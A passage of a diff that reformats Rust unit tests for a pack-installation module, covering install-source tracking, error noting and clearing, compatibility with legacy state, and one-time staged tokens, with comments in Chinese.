+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 3, true),
+            true,
+            INSTALL_SOURCE_MANIFEST,
+            "",
+        )
+        .unwrap();
         take_pending("play-x");
         let st = load_state(&dir);
         let p = st.pack("play-x").unwrap();
         assert_eq!(p.install_source, "manifest");
         assert_eq!(p.install_ref, "");
         // 再来一次自管更新：仍保留（上一轮写入的）manifest 来源
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 4, true), true, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 4, true),
+            true,
+            "",
+            "",
+        )
+        .unwrap();
         take_pending("play-x");
         let st = load_state(&dir);
         assert_eq!(st.pack("play-x").unwrap().install_source, "manifest");
@@ -2252,7 +2525,14 @@ mod tests {
         // 旁路签名闸门：这里测的是来源归属语义，且模拟的是签名落地前的
         // 历史安装路径（闸门本身的验证见 official_pack_gate_* 测试）
         let _gate = SignatureGateBypass::new();
-        install_pack_at(&dir, &pack_text(PACK_KIND_META, OFFICIAL_META_ID, 5, false), true, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_META, OFFICIAL_META_ID, 5, false),
+            true,
+            "",
+            "",
+        )
+        .unwrap();
         take_pending(OFFICIAL_META_ID);
         let st = load_state(&dir);
         let p = st.pack(OFFICIAL_META_ID).unwrap();
@@ -2264,14 +2544,31 @@ mod tests {
     #[test]
     fn note_and_clear_pack_error_roundtrip() {
         let dir = tmp_dir("err-note");
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-e", 1, true), false, INSTALL_SOURCE_URL, "https://e/x.js").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-e", 1, true),
+            false,
+            INSTALL_SOURCE_URL,
+            "https://e/x.js",
+        )
+        .unwrap();
         take_pending("play-e");
-        note_pack_error_at(&dir, "play-e", "  装载失败：ReferenceError: x is not defined  ");
+        note_pack_error_at(
+            &dir,
+            "play-e",
+            "  装载失败：ReferenceError: x is not defined  ",
+        );
         let st = load_state(&dir);
         let p = st.pack("play-e").unwrap();
-        assert_eq!(p.last_error, "装载失败：ReferenceError: x is not defined", "trim 后入库");
+        assert_eq!(
+            p.last_error, "装载失败：ReferenceError: x is not defined",
+            "trim 后入库"
+        );
         let stamped_at = p.last_error_at;
-        assert!(stamped_at > 1_700_000_000_000, "毫秒时间戳（unix 秒会是 10 位）");
+        assert!(
+            stamped_at > 1_700_000_000_000,
+            "毫秒时间戳（unix 秒会是 10 位）"
+        );
         drop(p);
         // 同一条失败不重复刷时间
         note_pack_error_at(&dir, "play-e", "装载失败：ReferenceError: x is not defined");
@@ -2281,7 +2578,11 @@ mod tests {
         note_pack_error_at(&dir, "ghost-id", "boom");
         // 空串 → 不记
         note_pack_error_at(&dir, "play-e", "   ");
-        assert!(!load_state(&dir).pack("play-e").unwrap().last_error.is_empty());
+        assert!(!load_state(&dir)
+            .pack("play-e")
+            .unwrap()
+            .last_error
+            .is_empty());
         // 成功生效 → 清除
         clear_pack_error_at(&dir, "play-e");
         let st = load_state(&dir);
@@ -2295,7 +2596,11 @@ mod tests {
         let dir = tmp_dir("legacy");
         let target = install_dir(&dir, "play-official");
         std::fs::create_dir_all(&target).unwrap();
-        std::fs::write(target.join(ARTIFACT_PLAY), pack_text(PACK_KIND_PLAY, "play-official", 1, true)).unwrap();
+        std::fs::write(
+            target.join(ARTIFACT_PLAY),
+            pack_text(PACK_KIND_PLAY, "play-official", 1, true),
+        )
+        .unwrap();
         let legacy = r#"{
             "schema": 3,
             "packs": [{"id":"play-official","kind":"play","name":"官方播放包","versionCode":1,
@@ -2308,7 +2613,10 @@ mod tests {
         std::fs::write(state_path(&dir), legacy).unwrap();
         let st = load_state(&dir);
         let p = st.pack("play-official").unwrap();
-        assert_eq!(p.install_source, "", "旧 v3 状态缺新字段 → 默认空（向后兼容）");
+        assert_eq!(
+            p.install_source, "",
+            "旧 v3 状态缺新字段 → 默认空（向后兼容）"
+        );
         assert_eq!(p.install_ref, "");
         assert_eq!(p.last_error, "");
         assert_eq!(p.last_error_at, 0);
@@ -2326,7 +2634,10 @@ mod tests {
         let staged = take_staged(&token).expect("token 取回暂存现场");
         assert_eq!(staged.channel, INSTALL_SOURCE_URL);
         assert!(staged.text.contains("__QT_PACK__"));
-        assert!(take_staged(&token).is_none(), "一次性消费：重复确认自然失败");
+        assert!(
+            take_staged(&token).is_none(),
+            "一次性消费：重复确认自然失败"
+        );
         assert!(take_staged("no-such-token").is_none());
     }
 }
